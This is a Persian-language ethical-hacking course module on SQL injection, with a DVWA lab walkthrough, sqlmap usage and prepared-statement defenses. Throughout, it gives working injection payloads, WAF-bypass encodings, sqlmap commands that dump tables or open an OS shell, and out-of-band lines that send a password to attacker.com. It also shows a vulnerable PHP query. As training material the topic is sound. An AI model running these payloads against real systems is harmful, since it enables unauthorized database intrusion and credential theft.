🔰 مقدمه – SQL Injection چیست؟

SQL Injection (تزریق SQL) یکی از معروف‌ترین، قدیمی‌ترین و خطرناک‌ترین آسیب‌پذیری‌های امنیت برنامه‌های وب است. در این حمله، مهاجم با تزریق کدهای SQL مخرب به ورودی‌های برنامه (مانند فرم‌ها، پارامترهای URL یا کوکی‌ها)، کوئری‌های SQL اصلی را تغییر داده و به اطلاعات حساس پایگاه داده دسترسی پیدا می‌کند.

SQL Injection از سال ۱۹۹۸ شناسایی شده و همچنان یکی از اصلی‌ترین تهدیدات برنامه‌های وب محسوب می‌شود. این آسیب‌پذیری در لیست OWASP Top 10 در رتبه سوم قرار دارد و سالانه خسارت‌های مالی و اعتباری هنگفتی به سازمان‌ها وارد می‌کند.

در این ماژول، با مفاهیم پایه SQL، انواع حملات SQL Injection، روش‌های تشخیص، ابزارهای تخصصی و مهم‌تر از همه، تکنیک‌های جلوگیری از این آسیب‌پذیری آشنا خواهید شد.

⚠️ هشدار اخلاقی: SQL Injection یکی از جدی‌ترین تهدیدات امنیتی است. تمام تمرینات این ماژول فقط در محیط‌های آزمایشگاهی با مجوز انجام شوند. حمله به پایگاه‌های داده واقعی بدون مجوز جرم است.

📖 مفاهیم پایه SQL

برای درک SQL Injection، ابتدا باید با مفاهیم پایه SQL (Structured Query Language) آشنا شوید. SQL زبانی است که برای مدیریت پایگاه‌های داده رابطه‌ای استفاده می‌شود.

📌 دستورات اصلی SQL:

دستورکاربردمثال
SELECTخواندن داده از پایگاه دادهSELECT * FROM users
INSERTاضافه کردن داده جدیدINSERT INTO users VALUES ('admin','pass')
UPDATEبه‌روزرسانی دادهUPDATE users SET password='new' WHERE id=1
DELETEحذف دادهDELETE FROM users WHERE id=1
UNIONترکیب نتایج دو کوئریSELECT name FROM users UNION SELECT password FROM secrets
JOINاتصال چند جدولSELECT * FROM orders JOIN users ON orders.user_id = users.id

📌 مثال یک کوئری SQL آسیب‌پذیر:

<?php
$id = $_GET['id'];
$query = "SELECT * FROM products WHERE id = $id";
$result = mysqli_query($conn, $query);
?>

در این کد، ورودی کاربر مستقیماً در کوئری قرار گرفته است. اگر کاربر به جای یک عدد، کد SQL مخرب وارد کند، کوئری تغییر می‌کند و مهاجم می‌تواند به تمام داده‌های جدول دسترسی پیدا کند.

💡 نکته: درک دقیق SQL برای شناسایی و بهره‌برداری از SQL Injection ضروری است.

🎯 انواع SQL Injection

SQL Injection به سه دسته اصلی تقسیم می‌شود که هر کدام روش‌های تشخیص و بهره‌برداری خاص خود را دارند:

📌 ۱. In-band SQL Injection (کلاسیک)

  • مهاجم از همان کانال ارتباطی برای تزریق و دریافت داده استفاده می‌کند.
  • شامل دو نوع است:
    • Union-based: استفاده از دستور UNION برای ترکیب نتایج.
    • Error-based: استفاده از پیام‌های خطای پایگاه داده برای استخراج اطلاعات.
  • ساده‌ترین و رایج‌ترین نوع.

📌 ۲. Blind SQL Injection (کور)

  • مهاجم پاسخ مستقیم دریافت نمی‌کند و باید از تفاوت‌های رفتار برنامه استفاده کند.
  • شامل دو نوع است:
    • Boolean-based: استفاده از شرط‌های True/False برای تشخیص.
    • Time-based: استفاده از تأخیر در پاسخ برای تشخیص.
  • سخت‌تر اما در بسیاری از برنامه‌ها وجود دارد.

📌 ۳. Out-of-band SQL Injection

  • مهاجم از یک کانال ارتباطی دیگر (مانند DNS یا HTTP) برای دریافت داده استفاده می‌کند.
  • معمولاً زمانی استفاده می‌شود که In-band و Blind ممکن نباشند.
  • کمتر رایج اما بسیار قدرتمند.
💡 نکته: انتخاب نوع حمله به ساختار برنامه و امکانات موجود بستگی دارد. معمولاً با In-band شروع می‌شود و در صورت نیاز به Blind یا Out-of-band می‌روند.

📡 In-band SQL Injection (Union-based و Error-based)

In-band SQL Injection رایج‌ترین و ساده‌ترین نوع SQL Injection است که در آن مهاجم مستقیماً نتایج کوئری را در پاسخ HTTP مشاهده می‌کند.

🔵 Union-based SQL Injection

در این روش، مهاجم از دستور UNION برای ترکیب نتایج کوئری اصلی با نتایج کوئری خود استفاده می‌کند. هدف اصلی پیدا کردن تعداد ستون‌ها و سپس استخراج داده از جداول دیگر است.

📌 مراحل Union-based SQLi:

  1. پیدا کردن تعداد ستون‌ها: با استفاده از ORDER BY یا UNION SELECT NULL.
  2. پیدا کردن ستون‌های قابل نمایش: شناسایی ستون‌هایی که در صفحه نمایش داده می‌شوند.
  3. استخراج اطلاعات: استفاده از UNION SELECT برای خواندن داده از جداول دیگر.
# پیدا کردن تعداد ستون‌ها
1' ORDER BY 1-- -
1' ORDER BY 2-- -
1' ORDER BY 3-- -

# پیدا کردن ستون‌های قابل نمایش (با شمارنده NULL)
1' UNION SELECT NULL,NULL,NULL-- -

# استخراج نام پایگاه داده
1' UNION SELECT NULL,database(),NULL-- -

# استخراج نام جداول
1' UNION SELECT NULL,table_name,NULL FROM information_schema.tables-- -

# استخراج داده از جدول users
1' UNION SELECT NULL,username,password FROM users-- -

🔴 Error-based SQL Injection

در این روش، مهاجم از پیام‌های خطای پایگاه داده برای استخراج اطلاعات استفاده می‌کند. برخی از پایگاه‌های داده مانند MySQL، پیام‌های خطای مفصلی را نمایش می‌دهند که می‌توانند حاوی اطلاعات مفیدی باشند. 

# ایجاد خطای تقسیم بر صفر برای نمایش نام پایگاه داده
1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(database(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -

# استخراج نام جدول
1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(table_name,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -
💡 نکته: Error-based SQLi یکی از سریع‌ترین روش‌های استخراج اطلاعات است، اما نیاز به نمایش خطاهای پایگاه داده دارد که در بسیاری از برنامه‌های مدرن غیرفعال است.

🕵️ Blind SQL Injection (Boolean-based و Time-based)

Blind SQL Injection زمانی استفاده می‌شود که برنامه نتایج کوئری را به کاربر نمایش نمی‌دهد و پیام‌های خطا نیز غیرفعال هستند. در این حالت، مهاجم باید از تفاوت‌های رفتار برنامه برای استخراج اطلاعات استفاده کند.

⚪ Boolean-based Blind SQLi

مهاجم با ارسال کوئری‌های شرطی (True/False) و مشاهده تفاوت در پاسخ برنامه (مثل محتوای صفحه، کد وضعیت HTTP) اطلاعات را استخراج می‌کند. 

# بررسی وجود یک رکورد
1' AND 1=1-- -   // True → صفحه عادی
1' AND 1=2-- -   // False → صفحه خالی یا خطا

# استخراج کاراکتر اول نام پایگاه داده (با حدس)
1' AND SUBSTRING(database(),1,1)='a'-- -
1' AND ASCII(SUBSTRING(database(),1,1))=97-- -

# استخراج نام جدول (کاراکتر به کاراکتر)
1' AND SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT 1),1,1)='u'-- -

⏱️ Time-based Blind SQLi

مهاجم با استفاده از توابعی مانند SLEEP() یا BENCHMARK() تأخیر در پاسخ ایجاد می‌کند و بر اساس زمان پاسخ (با یا بدون تأخیر) اطلاعات را استخراج می‌کند. 

# بررسی وجود رکورد با تأخیر ۵ ثانیه
1' AND SLEEP(5)-- -   // اگر True باشد، ۵ ثانیه تأخیر

# استخراج کاراکتر اول نام پایگاه داده
1' AND IF(ASCII(SUBSTRING(database(),1,1))=97,SLEEP(5),0)-- -
⚠️ هشدار: Time-based SQLi زمان‌بر است و ممکن است شبکه را تحت تأثیر قرار دهد. در محیط‌های واقعی باید با دقت استفاده شود.

🌐 Out-of-band SQL Injection

Out-of-band SQL Injection زمانی استفاده می‌شود که مهاجم نتواند از In-band یا Blind استفاده کند. در این روش، مهاجم از قابلیت‌های پایگاه داده (مانند LOAD_FILE()، INTO OUTFILE یا DNS requests) برای ارسال اطلاعات به یک سرور خارجی استفاده می‌کند.

📌 مثال Out-of-band با DNS (MySQL):

# ارسال نام پایگاه داده از طریق DNS
1' UNION SELECT LOAD_FILE(CONCAT('\\\\',database(),'.attacker.com\\test'))-- -

# ارسال اطلاعات از طریق HTTP با UTL_HTTP (Oracle)
1' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT password FROM users WHERE id=1)) FROM dual-- -
💡 نکته: Out-of-band SQLi بسیار قدرتمند است اما نیاز به شرایط خاصی دارد (مثل دسترسی به UTL_HTTP یا DNS).

🔍 تشخیص SQL Injection

تشخیص SQL Injection اولین گام برای بهره‌برداری است. روش‌های مختلفی برای تشخیص وجود دارد که در ادامه معرفی می‌شوند:

📌 روش‌های دستی:

  • تست با کاراکترهای ویژه: وارد کردن '، "، ;، ) و مشاهده خطا.
  • تست با عبارات منطقی: 1' AND 1=1-- - و 1' AND 1=2-- - و مقایسه پاسخ‌ها.
  • تست با تأخیر: 1' AND SLEEP(5)-- - و بررسی زمان پاسخ.
  • تست با UNION: 1' UNION SELECT NULL-- - و مشاهده تغییرات.

📌 ابزارهای تشخیص خودکار:

  • SQLmap: قوی‌ترین ابزار خودکار.
  • Burp Suite: با پسوندهای مختلف (مانند SQLi Scanner).
  • OWASP ZAP: با قابلیت اسکن خودکار.
  • Acunetix: اسکنر تجاری.
# تست دستی ساده در یک فرم ورود
ورودی: admin'--
# اگر برنامه با موفقیت وارد شود، احتمال SQL Injection وجود دارد.

# تست با خطا
ورودی: admin' AND 1=1--
ورودی: admin' AND 1=2--
# اگر پاسخ‌ها متفاوت باشند، احتمال SQL Injection وجود دارد.

# تست با UNION
ورودی: 1' UNION SELECT NULL, NULL, NULL-- -
# اگر صفحه تغییر کند یا خطایی رخ دهد، شماره ستون‌ها قابل تشخیص است.
💡 نکته: تست با کاراکتر ساده ' یکی از سریع‌ترین راه‌ها برای تشخیص SQL Injection است.

🛠️ ابزارهای SQL Injection

ابزارهای متعددی برای تشخیص و بهره‌برداری از SQL Injection وجود دارند که در این بخش مهم‌ترین آنها را معرفی می‌کنیم:

ابزارنوعویژگی‌ها
SQLmap خودکار (خط فرمان) قوی‌ترین ابزار، پشتیبانی از تمام انواع SQLi، خودکارسازی کامل
Burp Suite دستی/نیمه‌خودکار پسوندهای مختلف برای SQLi، دستکاری درخواست‌ها
OWASP ZAP دستی/نیمه‌خودکار اسکن خودکار SQLi، رابط گرافیکی
Havij خودکار (ویندوز) رابط گرافیکی، مناسب برای مبتدیان (ویندوز)
jSQL خودکار (جاوا) رابط گرافیکی، پشتیبانی از انواع SQLi
SQLNinja خودکار تخصصی برای SQL Injection در MS SQL Server
BBQSQL خودکار (Python) Blind SQL Injection با پشتیبانی از Boolean و Time-based
💡 نکته: SQLmap قوی‌ترین و محبوب‌ترین ابزار SQL Injection است که در Kali Linux به صورت پیش‌فرض نصب است.

📡 آموزش جامع SQLmap

SQLmap یک ابزار متن‌باز قدرتمند برای تشخیص و بهره‌برداری از آسیب‌پذیری‌های SQL Injection است. این ابزار در Kali Linux به صورت پیش‌فرض نصب است و از تمام انواع SQL Injection پشتیبانی می‌کند.

📌 دستورات پایه SQLmap:

دستورتوضیح
sqlmap -u "http://target.com/page.php?id=1"تشخیص خودکار SQLi در یک URL
sqlmap -u "..." --dbsلیست پایگاه‌های داده
sqlmap -u "..." -D database_name --tablesلیست جداول یک پایگاه داده
sqlmap -u "..." -D database_name -T table_name --dumpاستخراج داده از یک جدول
sqlmap -u "..." --cookie="PHPSESSID=abc123"استفاده از کوکی برای احراز هویت
sqlmap -u "..." --data="id=1&name=test"ارسال درخواست POST
sqlmap -u "..." --level=3 --risk=2اسکن با سطح و ریسک بالاتر
sqlmap -u "..." --os-shellدریافت شل سیستمی (در صورت دسترسی)
sqlmap -u "..." --batchاجرای خودکار بدون سوال
sqlmap -u "..." --threads=10استفاده از ۱۰ ترد برای سرعت بیشتر
# اسکن یک URL ساده
sqlmap -u "http://192.168.1.101/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=abc123"

# اگر کوکی نیاز باشد (برای DVWA):
sqlmap -u "http://192.168.1.101/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=12345"

# استخراج پایگاه‌های داده
sqlmap -u "..." --cookie="..." --dbs

# استخراج جداول پایگاه داده 'dvwa'
sqlmap -u "..." --cookie="..." -D dvwa --tables

# استخراج داده از جدول 'users'
sqlmap -u "..." --cookie="..." -D dvwa -T users --dump

# دریافت شل سیستمی (در صورت وجود آسیب‌پذیری پیشرفته)
sqlmap -u "..." --cookie="..." --os-shell
💡 نکته: SQLmap بسیار قدرتمند است اما باید با دقت و فقط در محیط‌های مجاز استفاده شود. استفاده از گزینه --batch برای خودکارسازی کامل مفید است.

🚀 تکنیک‌های پیشرفته SQL Injection

پس از آشنایی با مبانی، در این بخش با تکنیک‌های پیشرفته‌تر SQL Injection آشنا می‌شوید:

📌 ۱. Second-Order SQL Injection

در این نوع، payload در ابتدا در پایگاه داده ذخیره می‌شود و سپس در یک کوئری دیگر (بدون فیلتر) اجرا می‌شود. این نوع از حملات به دلیل ذخیره‌سازی، تشخیص‌پذیری کمتری دارند.

📌 ۲. SQL Injection در Stored Procedures

بسیاری از برنامه‌ها از Stored Procedures برای دسترسی به پایگاه داده استفاده می‌کنند. اگر ورودی‌ها به درستی فیلتر نشوند، مهاجم می‌تواند به Stored Procedures تزریق کند.

📌 ۳. SQL Injection در JSON/XML

با افزایش استفاده از APIها، SQL Injection در payloadهای JSON و XML نیز رایج شده است. مهاجم می‌تواند کد SQL را در فیلدهای JSON یا XML تزریق کند.

📌 ۴. DNS Exfiltration

در برخی موارد، مهاجم نمی‌تواند داده را مستقیماً دریافت کند. با استفاده از DNS requests، می‌تواند داده را به سرور خود ارسال کند. 

# Second-Order SQL Injection
مرحله ۱: ثبت نام با username = admin'--
مرحله ۲: در پروفایل کاربر، کوئری بعدی اجرا می‌شود که آسیب‌پذیر است

# SQL Injection در JSON
{"username": "admin'--", "password": "test"}

# DNS Exfiltration (MySQL)
1' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users WHERE id=1),'.attacker.com\\test'))-- -
⚠️ هشدار: تکنیک‌های پیشرفته نیاز به دانش بالایی از پایگاه داده و برنامه دارند و فقط در محیط‌های مجاز استفاده شوند.

🛡️ دور زدن WAF و فیلترها (WAF Bypass)

بسیاری از برنامه‌های وب از WAF (Web Application Firewall) یا فیلترهای ورودی برای جلوگیری از SQL Injection استفاده می‌کنند. در این بخش، تکنیک‌های دور زدن این فیلترها را معرفی می‌کنیم:

📌 تکنیک‌های رایج Bypass:

  • تغییر حروف (Case Variation): SeLeCt به جای SELECT
  • استفاده از کدگذاری URL: %27 به جای '
  • استفاده از کدگذاری دوگانه: %2527 (URL encoding دوگانه)
  • استفاده از کامنت‌های مختلف: -- -، #، /* */
  • استفاده از تابع‌های جایگزین: CONCAT() به جای +
  • استفاده از کدهای یونیکد: %c0%a7 به جای '
  • استفاده از تکنیک‌های Obfuscation: /**/ برای شکستن کلمات کلیدی
  • استفاده از تکنیک‌های SQL خاص: /*!50000SELECT*/ (برخی پایگاه‌های داده از این کامنت‌ها پشتیبانی می‌کنند)
# نمونه‌های Bypass
1' OR '1'='1'-- -          // معمولی
1' %4F%52 '1'='1'-- -     // URL Encoding
1' /**/OR/**/'1'='1'-- -  // کامنت‌ها
1' || '1'='1'-- -         // عملگر جایگزین (PostgreSQL)
1' OR 1=1#                // کامنت #

# استفاده از تابع‌های جایگزین
SELECT CONCAT('a','b') AS test

# Obfuscation با کامنت‌های SQL
1' /*!OR*/ '1'='1'-- -
💡 نکته: دور زدن WAF نیاز به آزمایش و خطا دارد. استفاده از ابزارهایی مانند SQLmap با گزینه --tamper می‌تواند کمک کند.

🛡️ راه‌های مقابله با SQL Injection

برای جلوگیری از SQL Injection، توسعه‌دهندگان و مدیران باید اقدامات زیر را انجام دهند:

📌 اقدامات کلی:

  • استفاده از Prepared Statements (Parameterized Queries): مهم‌ترین و مؤثرترین روش.
  • استفاده از Stored Procedures: با پارامترهای امن.
  • فیلتر کردن ورودی‌ها (Input Validation): اعتبارسنجی نوع و طول داده.
  • استفاده از ORM (Object-Relational Mapping): مانند Hibernate، Entity Framework.
  • محدود کردن مجوزهای پایگاه داده: اصل کمترین دسترسی.
  • غیرفعال کردن نمایش خطاها: جلوگیری از نمایش پیام‌های خطای پایگاه داده.
  • استفاده از WAF: محافظت در برابر حملات.
  • به‌روزرسانی منظم: نصب وصله‌های امنیتی.
  • آموزش توسعه‌دهندگان: آموزش کدنویسی امن.

📌 مثال Prepared Statements در PHP:

<?php
$conn = new mysqli($servername, $username, $password, $dbname);
$stmt = $conn->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->bind_param("ss", $username, $password);
$username = $_POST['username'];
$password = $_POST['password'];
$stmt->execute();
$result = $stmt->get_result();
?>

📌 مثال Prepared Statements در Python (SQLite):

import sqlite3
conn = sqlite3.connect('database.db')
cursor = conn.cursor()
cursor.execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, password))
💡 نکته: Prepared Statements تنها روش ۱۰۰٪ مؤثر برای جلوگیری از SQL Injection هستند. هرگز ورودی‌های کاربر را مستقیماً در کوئری‌های SQL قرار ندهید.

🤖 SQL Injection با هوش مصنوعی

CEH v13 به عنوان اولین نسخه‌ای که هوش مصنوعی را در تمام مراحل هک قانونمند ادغام کرده، به نقش هوش مصنوعی در SQL Injection نیز می‌پردازد.

📌 نقش هوش مصنوعی در SQL Injection:

  • تشخیص خودکار آسیب‌پذیری‌ها: AI می‌تواند کد برنامه را تحلیل کرده و نقاط آسیب‌پذیر را پیدا کند.
  • تولید Payloadهای هوشمند: AI می‌تواند payloadهایی تولید کند که از WAF عبور کنند.
  • بهینه‌سازی حملات Blind: AI می‌تواند حملات Boolean/Time-based را بهینه‌سازی کند.
  • تحلیل خودکار نتایج: AI می‌تواند نتایج حملات را تحلیل کرده و اطلاعات مفید را استخراج کند.

📌 ابزارهای AI-Powered SQL Injection:

  • AI-Based Vulnerability Scanners: اسکنرهای مبتنی بر AI.
  • AI-Powered Payload Generators: تولید payloadهای هوشمند.
  • AI-Driven WAF Bypass: دور زدن WAF با AI.
💡 چرا هوش مصنوعی در SQL Injection مهم است؟

هوش مصنوعی می‌تواند آسیب‌پذیری‌های SQL Injection را سریع‌تر و دقیق‌تر از روش‌های دستی شناسایی کند و حملات هدفمندتری طراحی کند.

🧪 کارگاه عملی – SQL Injection

در این کارگاه، شما با تکنیک‌ها و ابزارهای SQL Injection آشنا خواهید شد و یک سناریوی کامل از حمله SQL Injection را در محیط آزمایشگاهی پیاده‌سازی می‌کنید.

🎯 هدف کارگاه:

  • شناسایی SQL Injection در یک برنامه وب آسیب‌پذیر.
  • اجرای Union-based SQL Injection.
  • اجرای Blind SQL Injection (Boolean-based و Time-based).
  • استفاده از SQLmap برای خودکارسازی حملات.
  • مقابله با SQL Injection با استفاده از Prepared Statements.

🖥️ محیط مورد نیاز:

  • حمله‌کننده: Kali Linux
  • هدف: DVWA (Damn Vulnerable Web Application) روی Metasploitable 2
  • ابزارها: Firefox Developer Tools, SQLmap, Burp Suite (اختیاری)

📝 سناریوی گام‌به‌گام:

مرحله ۱: راه‌اندازی محیط آزمایشگاهی

# روی Metasploitable 2
sudo service apache2 start

# دسترسی به DVWA: http://192.168.1.101/dvwa/
# ورود: admin / password
# تنظیم Security Level به Low

مرحله ۲: شناسایی SQL Injection در صفحه کاربران

# به صفحه SQL Injection بروید: http://192.168.1.101/dvwa/vulnerabilities/sqli/
# در کادر ID، یک کاراکتر ' وارد کنید
# مشاهده خطا: "You have an error in your SQL syntax; ..."
# این نشان‌دهنده وجود SQL Injection است

مرحله ۳: Union-based SQL Injection (دستی)

# پیدا کردن تعداد ستون‌ها
1' ORDER BY 1-- -
1' ORDER BY 2-- -
1' ORDER BY 3-- -

# پیدا کردن ستون‌های قابل نمایش (با UNION SELECT)
1' UNION SELECT NULL, NULL-- -
1' UNION SELECT NULL, NULL, NULL-- -

# استخراج نام پایگاه داده
1' UNION SELECT NULL, database()-- -

# استخراج نام جداول
1' UNION SELECT table_name, NULL FROM information_schema.tables-- -

# استخراج داده از جدول users
1' UNION SELECT user, password FROM users-- -

مرحله ۴: Blind SQL Injection (Boolean-based)

# تنظیم Security Level به Medium یا High برای تست Blind
# تست با شرط True/False
1' AND 1=1-- -   // صفحه عادی
1' AND 1=2-- -   // صفحه خالی

# استخراج کاراکتر اول نام پایگاه داده
1' AND ASCII(SUBSTRING(database(),1,1))=100-- -

مرحله ۵: استفاده از SQLmap برای خودکارسازی

# اسکن خودکار (با کوکی)
sqlmap -u "http://192.168.1.101/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=abc123"

# استخراج پایگاه‌های داده
sqlmap -u "..." --cookie="..." --dbs

# استخراج جداول
sqlmap -u "..." --cookie="..." -D dvwa --tables

# استخراج داده
sqlmap -u "..." --cookie="..." -D dvwa -T users --dump

مرحله ۶: مقابله با SQL Injection

# در کد PHP، استفاده از Prepared Statements
$stmt = $conn->prepare("SELECT * FROM users WHERE id = ?");
$stmt->bind_param("i", $id);
$stmt->execute();
⏳ تکلیف: تمام مراحل بالا را در محیط آزمایشگاهی خود اجرا کنید و یک گزارش کامل از فرآیند SQL Injection، تشخیص و مقابله تهیه کنید.

📝 تمرین‌های عملی

این تمرینات به شما کمک می‌کنند تا مهارت‌های خود در زمینه SQL Injection را تقویت کنید.

  • تمرین ۱ – Union-based SQLi:
    روی DVWA در سطح Low، یک حمله Union-based SQL Injection انجام دهید و اطلاعات جدول users را استخراج کنید.
  • تمرین ۲ – Blind SQLi (Boolean):
    روی DVWA در سطح Medium، یک حمله Boolean-based Blind SQLi انجام دهید و نام پایگاه داده را پیدا کنید.
  • تمرین ۳ – Blind SQLi (Time):
    روی DVWA در سطح High، یک حمله Time-based Blind SQLi انجام دهید.
  • تمرین ۴ – SQLmap:
    با استفاده از SQLmap، یک اسکن کامل روی DVWA انجام دهید و تمام داده‌های پایگاه داده را استخراج کنید.
  • تمرین ۵ – WAF Bypass:
    یک WAF ساده (مانند ModSecurity) تنظیم کنید و سعی کنید با تکنیک‌های Bypass از آن عبور کنید.

📖 واژه‌نامه تخصصی (Glossary)

در این بخش، تمام واژه‌های تخصصی این ماژول، همراه با ساختار (ریشه یا مخفف)، تعریف ساده، کاربرد در هک، و یک مثال روزمره توضیح داده شده است.

واژه ساختار / مخفف تعریف ساده کاربرد در هک مثال
SQL Injection SQLi تزریق کد SQL به ورودی‌های برنامه. دسترسی به پایگاه داده. ' OR '1'='1
Union-based SQLi — استفاده از UNION برای ترکیب نتایج. استخراج داده از جداول دیگر. 1' UNION SELECT username, password FROM users-- -
Error-based SQLi — استفاده از پیام‌های خطا برای استخراج اطلاعات. نمایش اطلاعات از طریق خطا. 1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(database(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -
Blind SQLi — استخراج اطلاعات بدون نمایش مستقیم. زمانی که خطاها و نتایج نمایش داده نمی‌شوند. Boolean-based, Time-based.
Boolean-based — استفاده از شرط‌های True/False. مقایسه پاسخ‌ها برای استخراج اطلاعات. 1' AND 1=1-- -
Time-based — استفاده از تأخیر در پاسخ. بررسی زمان پاسخ برای استخراج اطلاعات. 1' AND SLEEP(5)-- -
Out-of-band SQLi — استفاده از کانال دیگر (DNS, HTTP). زمانی که In-band و Blind ممکن نیستند. LOAD_FILE(CONCAT('\\\\',database(),'.attacker.com\\test'))
Prepared Statement — کوئری با پارامترهای از پیش تعیین‌شده. جلوگیری از SQL Injection. $stmt->prepare("SELECT * FROM users WHERE id = ?")
WAF Web Application Firewall فایروال برنامه‌های وب. محافظت در برابر SQL Injection. Cloudflare WAF.
SQLmap — ابزار خودکار SQL Injection. تشخیص و بهره‌برداری. sqlmap -u "..." --dbs
DVWA Damn Vulnerable Web Application برنامه وب آسیب‌پذیر. محیط تمرین SQL Injection. http://192.168.1.101/dvwa/
Second-Order SQLi — تزریق در مرحله اول و اجرا در مرحله دوم. زمانی که payload ذخیره و بعداً اجرا می‌شود. ثبت نام با username مخرب.
WAF Bypass — دور زدن فیلترهای امنیتی. عبور از WAF با تکنیک‌های مختلف. URL Encoding, Case Variation.
